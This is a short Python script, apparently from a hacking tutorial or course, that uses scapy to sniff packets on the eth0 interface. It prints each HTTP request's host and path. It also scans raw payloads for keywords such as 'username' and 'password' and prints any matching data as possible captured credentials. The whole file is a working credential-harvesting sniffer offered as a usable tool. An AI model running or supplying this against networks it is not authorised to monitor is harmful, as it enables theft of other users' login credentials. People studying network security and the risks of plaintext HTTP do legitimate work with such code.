#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_packet)

def extract_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def extract_login_info(packet):
    if packet.haslayer(scapy.Raw):
        sniff_load = packet[scapy.Raw].load
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword.encode('utf-8') in sniff_load:  # must account for encoding in Python3
                return sniff_load

def process_packet(packet):
    #print(packet)
    if packet.haslayer(http.HTTPRequest):
        url = extract_url(packet)
        print ("[+} HTTP Request >> " + url.decode())

        login_info = extract_login_info(packet)
        if login_info:
            print("\n\n[+] Possible username/password > " + login_info.decode() + "\n\n")

sniff("eth0")